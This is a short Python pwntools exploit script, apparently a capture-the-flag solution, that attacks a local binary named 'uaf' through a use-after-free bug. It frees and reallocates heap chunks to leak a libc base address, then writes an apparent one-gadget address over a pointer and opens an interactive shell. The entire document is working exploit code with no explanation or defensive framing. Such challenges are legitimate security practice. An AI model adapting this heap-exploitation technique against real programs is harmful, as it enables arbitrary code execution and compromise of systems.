from pwn import *

def add (choice, size, message):
	r.sendafter(">\n", str(choice))
	r.sendafter("size:", str(size))
	r.sendafter("Messege:", str(message))

def bye (choice):
	r.sendafter(">\n", str(choice))

def show (choice):
	r.sendafter(">\n", str(choice))

r = process("./uaf")

add(1, 120, 123)
add(1, 120, 234)
bye(4)
add(1, 120, " ")
show(2)
# Leak libc
r.recvline()
r.recvuntil("2: ")
libc = u64(r.recv(6) + '\0\0')
offset = 0x3c4c20
libc -= offset
success("libc : %s" % hex(libc))
# After Leak libc
r.sendafter(">\n", str(2))
add(1, 0x20, "a" * 0x18 + p64(libc+0x45216)) 
bye(4)
r.interactive()
